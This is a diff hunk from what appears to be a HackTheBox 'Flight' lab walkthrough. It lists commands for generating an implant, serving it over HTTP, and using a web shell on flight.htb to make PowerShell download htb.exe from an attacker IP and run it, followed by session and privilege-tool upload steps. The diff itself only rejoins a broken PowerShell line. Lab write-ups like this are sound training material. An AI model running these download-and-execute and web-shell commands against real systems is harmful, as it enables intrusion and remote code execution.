@@ -43,8 +43,7 @@ generate --os windows --arch 64bit --mtls 10.10.14.10 --reconnect 60 --save htb.
 mtls
 sudo python3 -m http.server 80
 curl 'http://flight.htb/shell.php?c=powershell%20-c%20%22wget%2010.10.14.10%2Fhtb.exe%20-usebasicparsing%20-outfile%20C%3A%5Cusers%5Cpublic%5Cmusic%5Chtb.exe%3B%20C%3A%5Cusers%5Cpublic%5Cmusic%5Chtb.exe’
-powershell -c "wget 10.10.14.67/htb.exe
--usebasiparsing -outfile C:\users\public\music\htb.exe; C:\users\public\music\htb.exe
+powershell -c "wget 10.10.14.67/htb.exe -usebasiparsing -outfile C:\users\public\music\htb.exe; C:\users\public\music\htb.exe
 sessions -i ce7
 whoami
 upload RunasCs.exe
